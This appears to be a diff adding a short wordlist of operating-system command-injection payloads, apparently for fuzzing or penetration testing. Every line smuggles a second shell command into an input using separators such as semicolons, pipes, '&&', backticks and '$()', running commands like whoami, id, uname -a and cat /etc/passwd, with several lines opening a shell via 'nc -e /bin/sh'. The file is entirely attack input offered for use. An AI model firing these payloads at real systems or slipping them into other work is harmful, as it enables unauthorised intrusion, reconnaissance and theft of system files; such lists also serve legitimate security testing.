@@ -1,0 +1,31 @@
+; ping -c 1 127.0.0.1
+| ping -c 1 127.0.0.1
+`ping -c 1 127.0.0.1`
+$(ping -c 1 127.0.0.1)
+$(whoami)
+`whoami`
+| whoami
+; whoami
+| id
+; id
+$(id)
+`id`
+$(uname -a)
+`uname -a`
+; uname -a
+| uname -a
+$(cat /etc/passwd)
+`cat /etc/passwd`
+; cat /etc/passwd
+| cat /etc/passwd
+&& ping -c 1 127.0.0.1
+&& whoami
+| nc -e /bin/sh
+; nc -e /bin/sh
+&& id
+$(nslookup)
+`nslookup`
+| nslookup
+; nslookup
+$((7*7))
+$(((7*7)))
